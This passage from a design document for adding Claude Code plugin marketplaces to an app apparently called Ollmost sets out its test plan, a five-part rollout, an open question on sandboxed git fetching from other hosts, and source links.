    - Each limit, and a gzip bomb (a small download that inflates past the write limit).
    - Subpath filtering and dropping the top folder.
  - **`github.ts`:**
    - The fake `fetch` serves a canned `info/refs` for branches, tags and annotated tags (`^{}`).
    - The token goes only to allowed hosts and never follows a redirect.
    - The pax header check, and the 404, 403 and 429 messages.
  - **`install.ts`:**
    - Install, update and uninstall against a temporary data folder.
    - Crashes injected between each update step, then C3 recovery.
    - `enabled: false`.
  - **`library.ts`:**
    - Qualified names and ids.
    - A bare name resolving when unique and failing with candidates when not.
    - `disable-model-invocation` and `user-invocable`.
    - Variable substitution.
    - Plugin roots in `readableFolders()`.
  - **`webTools.approval`:** a table of chat states covering:
    - none;
    - a marketplace skill selected;
    - one loaded mid-reply;
    - one active alongside MCP servers or shared files, where `ask-every-time` wins;
    - a site already allowed for the chat;
    - an app skill only, which stays `auto`.
  - **`mcpImport`:** the plugin substitutions, `${NAME}` env values that start locked, and remote servers left out.
- **e2e (`e2e/run.mjs`):** a local folder marketplace (no network) → Browse → Review → Install turned on. Then, in a chat, `/plugin:skill` applies it, and a tools-capable model calls `load_skill` with the qualified name.
- **By hand, before release:** add all three Anthropic marketplaces, then review and install `document-skills`, one `git-subdir` plugin and one plugin using `${CLAUDE_PLUGIN_ROOT}`. Run one of each's scripts with the code runner on.

## Rollout

The work splits into five pull requests. Each builds on the one before.

1. **Library and the `web_fetch` rule:** qualified names, frontmatter flags, variables, the marketplace root reading install records, `readableFolders()`, and E1. No network. E1 lands first so it's in place before anything can be installed. Existing skills behave as before, apart from honouring `disable-model-invocation` and `user-invocable`.
2. **Main process:** sources, catalog, GitHub, unpack, install, recovery, IPC. Tests use fixtures and a fake `fetch`.
3. **Interface:** Browse, Review, Manage marketplaces, grouping and badges; the e2e run; the README.
4. **GitHub token and updates:** the token field, update detection, and the update review.
5. **A plugin's MCP servers:** C4.

## Open questions

1. **Other git hosts in v1.** Azure DevOps, GitLab, Bitbucket and self-hosted servers have no download URL shared with GitHub, so Ollmost would run `git` to fetch from them.
   - **Nothing is bundled.** Ollmost uses a `git` that's already installed. It finds one without triggering macOS's install prompt: `xcode-select -p` succeeds, or a `git` other than `/usr/bin/git` is on your login shell's PATH. When there's none, it says "Install Git to add marketplaces from <host>."
   - **It runs sandboxed**, per `src/main/code/git.ts`:
     - network only to that host, and writes only to the staging folder;
     - `--no-recurse-submodules`, `-c core.symlinks=false`, `-c protocol.file.allow=never`, and a sparse, blob-less clone for `git-subdir`;
     - the result goes through B4's rules like any archive.
   - **The catch is private repositories.** The sandbox hides your home folder, so your git config and credential helpers (for example, Git Credential Manager for Azure DevOps) aren't available. A private repository on another host would need a token per host, like the GitHub one, sent with `-c http.extraHeader`.
   - **In this work, or a follow-up?** GitHub covers every plugin in Anthropic's catalogs; other hosts matter for a team's own catalog.

## Sources

- **Claude Code docs:**
  - [Create a marketplace](https://code.claude.com/docs/en/plugin-marketplaces)
  - [Marketplace reference](https://code.claude.com/docs/en/plugins/marketplace-reference): source types, reserved names, `strict`, and relative paths in `url` marketplaces
  - [Plugin loading reference](https://code.claude.com/docs/en/plugins/loading): versions, the cache layout, synced plugins
  - [Publish and distribute a plugin](https://code.claude.com/docs/en/plugins/publish): Anthropic's directory and how to submit to it
  - [Skills](https://code.claude.com/docs/en/skills): frontmatter fields, variables, plugin skill names
- **Claude Help Center:** [Browse skills, connectors, and plugins in one directory](https://support.claude.com/en/articles/14328846-browse-skills-connectors-and-plugins-in-one-directory)
- **Anthropic repositories:**
  - [anthropics/skills](https://github.com/anthropics/skills): licensing of the document skills
  - [anthropics/claude-plugins-official](https://github.com/anthropics/claude-plugins-official)
  - [anthropics/knowledge-work-plugins](https://github.com/anthropics/knowledge-work-plugins)
- **Claude Code issue:** [anthropics/claude-code#53426](https://github.com/anthropics/claude-code/issues/53426): an entry's `skills` list should filter
- **git:** [`git archive`](https://git-scm.com/docs/git-archive) (the commit id in the pax header) and the [HTTP protocol](https://git-scm.com/docs/http-protocol) (`info/refs` ref advertisement)
